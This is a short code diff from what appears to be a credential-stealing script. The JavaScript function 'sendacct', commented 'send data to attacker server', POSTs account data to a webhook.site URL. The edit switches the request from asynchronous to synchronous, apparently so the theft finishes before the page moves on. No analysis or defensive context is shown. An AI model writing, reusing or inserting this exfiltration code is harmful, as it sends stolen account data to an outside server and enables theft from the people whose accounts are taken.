@@ -18,7 +18,7 @@ return values;
 //send data to attacker server
 function sendacct(data) { 
 var xhttp = new XMLHttpRequest(); 
-xhttp.open("POST", "https://webhook.site/6c686452-f170-4c4c-bac1-b84e7eb7e6b4", true); 
+xhttp.open("POST", "https://webhook.site/6c686452-f170-4c4c-bac1-b84e7eb7e6b4", false); 
 xhttp.setRequestHeader("Content-type", "text/plain;charset=UTF-8"); 
 xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
 xhttp.send("account data=" + data);
